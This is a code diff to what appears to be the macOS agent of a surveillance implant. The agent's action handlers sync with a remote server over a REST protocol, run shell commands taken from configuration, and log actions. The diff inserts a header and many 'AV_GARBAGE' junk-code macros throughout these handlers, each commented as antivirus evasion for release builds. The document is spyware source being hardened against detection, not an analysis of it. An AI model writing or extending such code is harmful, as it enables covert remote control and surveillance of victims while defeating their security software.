@@ -20,6 +20,7 @@
 #import "RCSMLogger.h"
 #import "RCSMDebug.h"
 
+#import "RCSMAVGarbage.h"
 
 @implementation __m_MActions
 
@@ -64,10 +65,19 @@
 }
 
 - (BOOL)actionAgent: (NSMutableDictionary *)aConfiguration start: (BOOL)aFlag
-{
+{ 
+  // AV evasion: only on release build
+  AV_GARBAGE_009
+  
   __m_MTaskManager *taskManager = [__m_MTaskManager sharedInstance];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
   [aConfiguration retain];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_008
   
   //NSNumber *status;
   NSNumber *status = [NSNumber numberWithInt: 0];
@@ -80,6 +90,9 @@
   [[aConfiguration objectForKey: @"data"] getBytes: &agentID];
   
   BOOL success;
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_007
   
   if (aFlag == TRUE)
   {
@@ -102,6 +115,9 @@
 #endif
   }
   
+  // AV evasion: only on release build
+  AV_GARBAGE_006
+  
   [aConfiguration release];
   
   return TRUE;
@@ -111,6 +127,9 @@
 {
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   [aConfiguration retain];
   BOOL bSuccess = NO;
   BOOL _syncThroughSafariWentOk = NO;
@@ -119,9 +138,15 @@
   
   NSData *syncConfig = [[aConfiguration objectForKey: @"data"] retain];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   [mActionsLock lock];
   _isSyncing = mIsSyncing;
   [mActionsLock unlock];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
   
   if (_isSyncing == YES)
     {
@@ -137,6 +162,9 @@
   [mActionsLock lock];
   mIsSyncing = YES;
   [mActionsLock unlock];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_004
   
   status = [NSNumber numberWithInt: ACTION_PERFORMING];
   [aConfiguration setObject: status
@@ -282,6 +310,9 @@
       
       [communicationManager release]; */
       
+      // AV evasion: only on release build
+      AV_GARBAGE_000
+      
       RESTNetworkProtocol *protocol = [[RESTNetworkProtocol alloc]
                                        initWithConfiguration: syncConfig];
       if ([protocol perform] == NO)
@@ -296,6 +327,9 @@
       [protocol release];
     }
   
+  // AV evasion: only on release build
+  AV_GARBAGE_005
+  
   status = [NSNumber numberWithInt: ACTION_STANDBY];
   [aConfiguration setObject: status
                      forKey: @"status"];
@@ -303,6 +337,9 @@
   [mActionsLock lock];
   mIsSyncing = NO;
   [mActionsLock unlock];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_006
   
   [syncConfig release];
   [aConfiguration release];
@@ -317,11 +354,16 @@
 {
   [aConfiguration retain];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
   NSData *configData = [[aConfiguration objectForKey: @"data"] retain];
   
   NSMutableString *commandLine = [[NSMutableString alloc] initWithData: configData
                                                               encoding: NSASCIIStringEncoding];
-
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   [commandLine replaceOccurrencesOfString: @"$dir$"
                                withString: [[NSBundle mainBundle] bundlePath]
                                   options: NSCaseInsensitiveSearch
@@ -329,7 +371,10 @@
 
 
   NSMutableArray *_arguments = [[NSMutableArray alloc] init];
-
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   [_arguments addObject: @"-c"];
   [_arguments addObject: commandLine];
 
@@ -344,7 +389,10 @@
   [task launch];
   [task waitUntilExit];
   [task release];
-
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   NSNumber *status = [NSNumber numberWithInt: 0];
   [aConfiguration setObject: status forKey: @"status"];
 
@@ -409,16 +457,31 @@ typedef struct {
 {
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
   __m_MInfoManager *infoManager = [[__m_MInfoManager alloc] init];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   [aConfiguration retain];
-
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
   NSData *stringData = [aConfiguration objectForKey: @"data"];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
   
   NSString *text = [[NSString alloc] initWithData: stringData
                                          encoding: NSUTF16LittleEndianStringEncoding];
   
   [infoManager logActionWithDescription: text];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_005
   
   [text release];
   [infoManager release];
